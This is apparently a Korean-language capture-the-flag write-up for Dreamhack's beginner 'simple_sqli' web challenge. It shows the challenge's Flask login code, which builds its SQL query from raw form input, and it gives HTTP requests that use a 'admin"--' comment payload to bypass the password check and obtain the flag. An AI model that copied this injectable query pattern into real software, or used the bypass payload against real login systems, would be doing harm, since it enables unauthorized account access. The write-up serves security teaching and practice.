# simple_sqli - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: web
- Difficulty (subjective): easy
- Points: 1
- Provided Files: app.py
- tools: Burp Suite
## Brief Description
로그인 서비스입니다.  
SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
## Initial Analysis
### Environment
- framework: 
    - flask
- URL End-Point:
    - /login
- Session: X / Cookie: O
### Code
``` python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```
`admin`으로 로그인하면, FLAG를 웹 페이지에 출력한다.  
## Vulnerability
### SQLI(SQL Injection)
``` python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```
웹 페이지의 form에서 `request`로 전달한 `userid`와 `userpassword`를 어떠한 검증 및 필터링 없이 그대로 `query`에 사용된다.  
## Exploit
### Strategy
sqli 취약점을 이용해, `admin`으로 로그인을 시도하여 FLAG를 획득할 것이다. `userid`를 `'admin"--'`로 입력하면 이후의 비밀번호 검증 `userpassword = "{userpassword}"`을 우회할 수 있다.  
### Exploitation Steps
``` http
POST /login HTTP/1.1
Host: host8.dreamhack.games:8269
Content-Length: 33
Cache-Control: max-age=0
Origin: http://host8.dreamhack.games:8269
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host8.dreamhack.games:8269/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Connection: keep-alive

userid=guest"--&userpassword=good
```
``` http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.2
Date: Thu, 04 Sep 2025 01:35:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 53
Connection: close

<script>alert("hello guest");history.go(-1);</script>
```
`userid`를 `guest"--`로 입력한 결과 비밀번호 검증을 건너뛰고 로그인 되는 것을 확인할 수 있다.  
### PoC(Poof of Concept)
``` http
POST /login HTTP/1.1
Host: host8.dreamhack.games:8269
Content-Length: 33
Cache-Control: max-age=0
Origin: http://host8.dreamhack.games:8269
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host8.dreamhack.games:8269/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Connection: keep-alive

userid=admin"--&userpassword=good
```
``` http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.2
Date: Thu, 04 Sep 2025 01:36:28 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 57
Connection: close

hello admin flag is DH{find_your_self:)}
```